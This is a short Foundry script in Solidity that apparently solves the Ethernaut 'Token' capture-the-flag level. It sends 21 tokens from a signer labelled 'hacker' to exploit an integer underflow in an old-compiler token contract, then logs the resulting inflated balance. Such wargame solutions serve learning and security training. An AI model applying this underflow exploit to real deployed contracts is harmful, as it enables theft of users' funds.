// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "src/05-Token.sol";


contract Exp is Script {

    Token public TokenInstance = Token(payable(0x32F0276B7C6eACCC25e967B764594E3b877e0296));
    address hacker = vm.rememberKey(vm.envUint("PRIVATE_KEY"));
    address owner = vm.envAddress("MY_ADDRESS");

    function run() external {
        vm.startBroadcast(hacker);

        TokenInstance.transfer(address(0), 21);
        console.log("value: ", TokenInstance.balanceOf(owner));
        vm.stopBroadcast();
    }
}